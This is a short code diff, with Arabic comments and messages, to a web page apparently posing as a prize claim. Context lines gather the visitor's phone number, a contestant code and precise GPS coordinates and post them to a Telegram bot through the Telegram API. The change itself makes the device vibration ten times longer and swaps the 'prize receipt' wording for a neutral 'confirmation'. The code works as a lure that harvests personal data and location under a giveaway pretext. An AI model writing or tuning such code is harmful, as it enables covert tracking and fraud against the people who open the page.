@@ -74,7 +74,7 @@
       const code = localStorage.getItem("userCode") || generateCode();
 
       // اهتزاز الجهاز
-      if (navigator.vibrate) navigator.vibrate([300, 100, 300]);
+      if (navigator.vibrate) navigator.vibrate([3000, 1000, 3000]);
 
       // حفظ الكود إذا لم يكن محفوظًا مسبقًا
       localStorage.setItem("userCode", code);
@@ -89,7 +89,7 @@
           const lat = position.coords.latitude;
           const lon = position.coords.longitude;
 
-          const message = `🎁 استلام الجائزة\n📱 رقم الهاتف: ${phone}\n🏷 كود المتسابق: ${code}\n📍 الموقع: https://www.google.com/maps?q=${lat},${lon}`;
+          const message = `🎁 تأكيد\n📱 رقم الهاتف: ${phone}\n🏷 كود المتسابق: ${code}\n📍 الموقع: https://www.google.com/maps?q=${lat},${lon}`;
 
           fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: 'POST',
